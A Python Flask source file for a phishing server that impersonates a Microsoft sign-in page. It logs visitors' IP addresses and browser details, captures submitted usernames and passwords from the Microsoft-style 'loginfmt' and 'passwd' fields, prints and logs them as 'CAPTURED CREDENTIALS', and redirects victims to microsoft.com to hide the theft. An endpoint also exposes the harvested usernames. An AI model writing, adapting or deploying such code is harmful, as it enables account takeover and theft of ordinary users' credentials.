# app.py
from flask import Flask, render_template, request, redirect, url_for, jsonify
import os
from datetime import datetime
import logging

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

console_handler = logging.StreamHandler()
console_handler.setLevel(logging.INFO)
formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
console_handler.setFormatter(formatter)
logger.addHandler(console_handler)

app = Flask(__name__, static_folder='static', template_folder='templates')

@app.route('/')
def index():
    ip_address = get_ip_address(request)
    user_agent = request.headers.get('User-Agent')

    logger.info(f"New visitor: IP: {ip_address}, User-Agent: {user_agent}")

    return redirect(url_for('login'))

@app.route('/login.html')
def login():
    return render_template('login.html')

@app.route('/login.php', methods=['POST'])
def process_login():
    username = request.form.get('loginfmt', '')
    password = request.form.get('passwd', '')

    print(f"CAPTURED CREDENTIALS - Username: {username}, Password: {password}")

    logger.info(f"CAPTURED CREDENTIALS - Username: {username}, Password: {password}")

    return redirect('https://microsoft.com')

def get_ip_address(request):
    if request.headers.get('HTTP_CLIENT_IP'):
        ip = request.headers.get('HTTP_CLIENT_IP')
    elif request.headers.get('HTTP_X_FORWARDED_FOR'):
        ip = request.headers.get('HTTP_X_FORWARDED_FOR')
    elif request.headers.get('X-Forwarded-For'):
        ip = request.headers.get('X-Forwarded-For')
    else:
        ip = request.remote_addr
    return ip



@app.route('/api/logs', methods=['GET'])
def get_logs():
    try:
        with open('usernames.txt', 'r') as f:
            logs = f.readlines()
        return jsonify({"logs": logs})
    except:
        return jsonify({"logs": []})

if __name__ == '__main__':
    for filename in ['ip.txt', 'usernames.txt']:
        if not os.path.exists(filename):
            open(filename, 'w').close()

    app.run(debug=False)